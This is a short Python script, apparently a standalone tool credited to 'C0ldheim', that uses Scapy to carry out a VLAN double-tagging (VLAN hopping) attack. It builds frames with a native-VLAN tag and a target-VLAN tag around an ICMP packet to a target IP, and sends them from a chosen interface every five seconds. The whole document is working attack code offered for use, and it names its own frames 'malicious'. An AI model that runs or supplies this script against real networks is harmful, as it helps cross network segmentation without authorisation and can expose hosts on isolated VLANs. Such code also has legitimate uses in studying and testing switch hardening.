#!/usr/bin/env python3

#by C0ldheim


from scapy.all import *
from scapy.layers.l2 import *
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--nativevlan", type=int, dest="nativevlan", required=True, help="Choose the native VLAN ID")
    parser.add_argument("--targetvlan", type=int, dest="targetvlan", required=True, help="Choose the target VLAN ID")
    parser.add_argument("--targetip", type=str, dest="targetip", required=True, help="Choose the target IP address")

    args = parser.parse_args()

    return args


args = get_arguments()


def maliciousframe(interface, nativevlan, targetvlan, targetip):
    frame = Ether(type=0x8100)
    first_dot1q_tag = Dot1Q(vlan=nativevlan, type=0x8100) # vlan tag 1
    second_dot1q_tag = Dot1Q(vlan=targetvlan, type=0x800) # vlan tag 2
    ip = IP(dst=targetip)
    icmp = ICMP()
    crafted = frame/first_dot1q_tag/second_dot1q_tag/ip/icmp
    sendp(crafted, iface=args.interface, loop=0, verbose=1)

try:
    while True:
        maliciousframe(args.interface, args.nativevlan, args.targetvlan, args.targetip)
        time.sleep(5)
except KeyboardInterrupt:
    print ("Exiting...")
    sys.exit(0)


